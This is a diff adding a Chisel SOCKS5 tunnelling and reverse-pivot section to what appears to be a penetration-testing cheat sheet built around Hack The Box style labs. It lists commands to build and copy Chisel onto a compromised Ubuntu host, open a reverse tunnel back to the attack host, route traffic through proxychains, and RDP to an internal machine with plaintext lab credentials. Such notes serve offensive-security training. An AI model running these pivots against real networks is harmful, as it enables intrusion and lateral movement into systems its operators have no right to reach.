@@ -1232,6 +1232,44 @@ git clone https://github.com/lukebaggett/dnscat2-powershell.git
 		dnscat2> ?
 		dnscat2> window -i 1
 ```
+##### SOCKS5 Tunneling with Chisel
+```
+>> from attack host (client side) to setup:-
+git clone https://github.com/jpillora/chisel.git
+cd chisel
+go build
+OR 
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o chisel_static
+file chisel_static
+scp chisel ubuntu@10.129.202.64:~/
+
+>> Running the Chisel Server on the Pivot Host
+./chisel server -v -p 1234 --socks5
+
+>> Connecting to the Chisel Server from the client:-
+./chisel client -v 10.129.202.64:1234 socks
+tail -n 20 /etc/proxychains4.conf
+sudo nano /etc/proxychains4.conf
+# socks4  127.0.0.1 9050
+socks5 127.0.0.1 1080
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+
+#### Chisel Reverse Pivot (In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.)
+
+>> Starting the Chisel Server on our Attack Host
+sudo ./chisel server --reverse -v -p 1234 --socks5
+
+>> Connecting the Chisel Client to our Attack Host from pivot host:-
+ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
+
+>> Editing & Confirming proxychains.conf
+sword0x00@htb[/htb]$ tail -f /etc/proxychains.conf
+# socks4    127.0.0.1 9050
+socks5 127.0.0.1 1080
+
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+
+```
 ## Attacking Common Services
 ##### Attacking FTP
 ```
